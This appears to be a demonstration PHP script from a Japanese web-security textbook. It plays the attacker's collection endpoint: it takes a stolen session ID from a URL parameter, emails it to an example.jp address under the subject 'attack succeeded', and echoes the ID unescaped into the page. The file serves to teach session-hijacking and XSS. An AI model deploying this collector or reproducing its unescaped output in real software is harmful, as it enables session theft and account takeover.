<?php

mb_language('Japanese');
mb_internal_encoding('UTF-8');
$sid = $_GET['sid'];
mb_send_mail('wasbook@example.jp',
    '攻撃成功',
    'セッションID:' . $sid,
    'From: cracked@trap.example.com');

?>

<!doctype html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>Document</title>
</head>
<body>
攻撃成功
<?php echo $sid; ?>
</body>
</html>
